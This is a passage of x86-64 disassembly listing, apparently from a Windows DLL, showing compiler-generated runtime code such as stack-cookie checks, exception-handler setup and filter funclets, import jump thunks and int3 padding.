   180003443:	49 63 c3             	movslq %r11d,%rax
   180003446:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   18000344a:	48 8b 43 10          	mov    0x10(%rbx),%rax
   18000344e:	8b 48 08             	mov    0x8(%rax),%ecx
   180003451:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180003455:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   18000345a:	74 0b                	je     0x180003467
   18000345c:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   180003461:	83 e0 f0             	and    $0xfffffff0,%eax
   180003464:	4c 03 c8             	add    %rax,%r9
   180003467:	4c 33 ca             	xor    %rdx,%r9
   18000346a:	49 8b c9             	mov    %r9,%rcx
   18000346d:	5b                   	pop    %rbx
   18000346e:	e9 2d ef ff ff       	jmp    0x1800023a0
   180003473:	cc                   	int3
   180003474:	48 8b c4             	mov    %rsp,%rax
   180003477:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000347b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000347f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180003483:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180003487:	41 56                	push   %r14
   180003489:	48 83 ec 20          	sub    $0x20,%rsp
   18000348d:	4d 8b 51 38          	mov    0x38(%r9),%r10
   180003491:	48 8b f2             	mov    %rdx,%rsi
   180003494:	4d 8b f0             	mov    %r8,%r14
   180003497:	48 8b e9             	mov    %rcx,%rbp
   18000349a:	49 8b d1             	mov    %r9,%rdx
   18000349d:	48 8b ce             	mov    %rsi,%rcx
   1800034a0:	49 8b f9             	mov    %r9,%rdi
   1800034a3:	41 8b 1a             	mov    (%r10),%ebx
   1800034a6:	48 c1 e3 04          	shl    $0x4,%rbx
   1800034aa:	49 03 da             	add    %r10,%rbx
   1800034ad:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   1800034b1:	e8 62 ff ff ff       	call   0x180003418
   1800034b6:	8b 45 04             	mov    0x4(%rbp),%eax
   1800034b9:	24 66                	and    $0x66,%al
   1800034bb:	f6 d8                	neg    %al
   1800034bd:	b8 01 00 00 00       	mov    $0x1,%eax
   1800034c2:	1b d2                	sbb    %edx,%edx
   1800034c4:	f7 da                	neg    %edx
   1800034c6:	03 d0                	add    %eax,%edx
   1800034c8:	85 53 04             	test   %edx,0x4(%rbx)
   1800034cb:	74 11                	je     0x1800034de
   1800034cd:	4c 8b cf             	mov    %rdi,%r9
   1800034d0:	4d 8b c6             	mov    %r14,%r8
   1800034d3:	48 8b d6             	mov    %rsi,%rdx
   1800034d6:	48 8b cd             	mov    %rbp,%rcx
   1800034d9:	e8 ab fe ff ff       	call   0x180003389
   1800034de:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800034e3:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800034e8:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1800034ed:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800034f2:	48 83 c4 20          	add    $0x20,%rsp
   1800034f6:	41 5e                	pop    %r14
   1800034f8:	c3                   	ret
   1800034f9:	ff 25 d1 0b 00 00    	jmp    *0xbd1(%rip)        # 0x1800040d0
   1800034ff:	cc                   	int3
   180003500:	cc                   	int3
   180003501:	cc                   	int3
   180003502:	cc                   	int3
   180003503:	cc                   	int3
   180003504:	cc                   	int3
   180003505:	cc                   	int3
   180003506:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000350d:	00 00 00 
   180003510:	ff e0                	jmp    *%rax
   180003512:	cc                   	int3
   180003513:	cc                   	int3
   180003514:	cc                   	int3
   180003515:	cc                   	int3
   180003516:	cc                   	int3
   180003517:	cc                   	int3
   180003518:	cc                   	int3
   180003519:	cc                   	int3
   18000351a:	cc                   	int3
   18000351b:	cc                   	int3
   18000351c:	cc                   	int3
   18000351d:	cc                   	int3
   18000351e:	cc                   	int3
   18000351f:	cc                   	int3
   180003520:	cc                   	int3
   180003521:	cc                   	int3
   180003522:	cc                   	int3
   180003523:	cc                   	int3
   180003524:	cc                   	int3
   180003525:	cc                   	int3
   180003526:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000352d:	00 00 00 
   180003530:	ff 25 72 0c 00 00    	jmp    *0xc72(%rip)        # 0x1800041a8
   180003536:	40 55                	rex push %rbp
   180003538:	48 83 ec 20          	sub    $0x20,%rsp
   18000353c:	48 8b ea             	mov    %rdx,%rbp
   18000353f:	8a 4d 40             	mov    0x40(%rbp),%cl
   180003542:	48 83 c4 20          	add    $0x20,%rsp
   180003546:	5d                   	pop    %rbp
   180003547:	e9 68 f7 ff ff       	jmp    0x180002cb4
   18000354c:	cc                   	int3
   18000354d:	40 55                	rex push %rbp
   18000354f:	48 83 ec 20          	sub    $0x20,%rsp
   180003553:	48 8b ea             	mov    %rdx,%rbp
   180003556:	8a 4d 20             	mov    0x20(%rbp),%cl
   180003559:	e8 56 f7 ff ff       	call   0x180002cb4
   18000355e:	90                   	nop
   18000355f:	48 83 c4 20          	add    $0x20,%rsp
   180003563:	5d                   	pop    %rbp
   180003564:	c3                   	ret
   180003565:	cc                   	int3
   180003566:	40 55                	rex push %rbp
   180003568:	48 83 ec 20          	sub    $0x20,%rsp
   18000356c:	48 8b ea             	mov    %rdx,%rbp
   18000356f:	48 83 c4 20          	add    $0x20,%rsp
   180003573:	5d                   	pop    %rbp
   180003574:	e9 c7 f5 ff ff       	jmp    0x180002b40
   180003579:	cc                   	int3
   18000357a:	40 55                	rex push %rbp
   18000357c:	48 83 ec 30          	sub    $0x30,%rsp
   180003580:	48 8b ea             	mov    %rdx,%rbp
   180003583:	48 8b 01             	mov    (%rcx),%rax
   180003586:	8b 10                	mov    (%rax),%edx
   180003588:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000358d:	89 54 24 20          	mov    %edx,0x20(%rsp)
   180003591:	4c 8d 0d 30 ee ff ff 	lea    -0x11d0(%rip),%r9        # 0x1800023c8
   180003598:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   18000359c:	8b 55 68             	mov    0x68(%rbp),%edx
   18000359f:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1800035a3:	e8 08 f5 ff ff       	call   0x180002ab0
   1800035a8:	90                   	nop
   1800035a9:	48 83 c4 30          	add    $0x30,%rsp
   1800035ad:	5d                   	pop    %rbp
   1800035ae:	c3                   	ret
   1800035af:	cc                   	int3
   1800035b0:	40 55                	rex push %rbp
   1800035b2:	48 8b ea             	mov    %rdx,%rbp
   1800035b5:	48 8b 01             	mov    (%rcx),%rax
   1800035b8:	33 c9                	xor    %ecx,%ecx
   1800035ba:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   1800035c0:	0f 94 c1             	sete   %cl
   1800035c3:	8b c1                	mov    %ecx,%eax
   1800035c5:	5d                   	pop    %rbp
   1800035c6:	c3                   	ret
   1800035c7:	cc                   	int3
